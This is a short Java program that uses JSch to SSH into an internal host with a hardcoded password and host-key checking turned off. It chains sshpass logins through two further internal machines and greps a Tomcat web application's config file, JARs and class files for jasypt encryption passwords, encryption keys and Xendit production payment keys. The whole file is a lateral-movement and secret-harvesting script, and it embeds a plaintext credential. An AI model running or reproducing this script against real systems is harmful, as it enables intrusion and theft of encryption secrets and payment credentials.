import com.jcraft.jsch.*;
import java.io.*;
class DKJAS {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    ChannelExec ch = (ChannelExec) jump.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.117 'sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 \"echo ---CONFIG-BASE---;grep -iE \\\"jasypt\\\\|encryptor\\\\|encrypt.password\\\\|ENC_KEY\\\\|xendit\\\" /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/classes/config.properties 2>/dev/null;echo ---GREP-JAR---;strings /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/lib/neo-*.jar 2>/dev/null | grep -iE \\\"encryptor.password\\\\|jasypt.password\\\\|xnd_production\\\" | head -10;echo ---STRINGS-XENDIT---;strings /progs/neo/neo-app/tomcat/8.0.53/webapps/neo/ROOT/WEB-INF/classes/com/cpssoft/web/neo/config/*.class 2>/dev/null | grep -iE \\\"xendit\\\\|xnd_\\\\|encrypt\\\\|jasypt\\\" | head -10\" 2>&1' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    jump.disconnect();
  }
}
